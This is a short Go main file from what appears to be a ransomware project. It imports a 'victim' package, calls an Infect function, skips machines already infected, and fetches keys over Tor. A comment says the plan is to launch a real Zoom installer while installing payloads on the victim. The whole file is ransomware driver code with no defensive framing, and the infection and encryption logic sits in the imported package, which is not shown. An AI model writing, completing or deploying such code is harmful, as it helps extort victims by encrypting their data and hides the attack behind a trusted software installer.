package main

import (
    "log"

    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
)

func main() {
    // TODO: start actual zoom installer and install payloads on victim
    ok, err := victim.Infect()
    if err != nil {
        log.Fatal(err)
    }
    if !ok {
        // victim has already been infected
        return
    }
    err = victim.DownloadKeysFromTor()
    if err != nil {
        log.Fatal(err)
    }
}
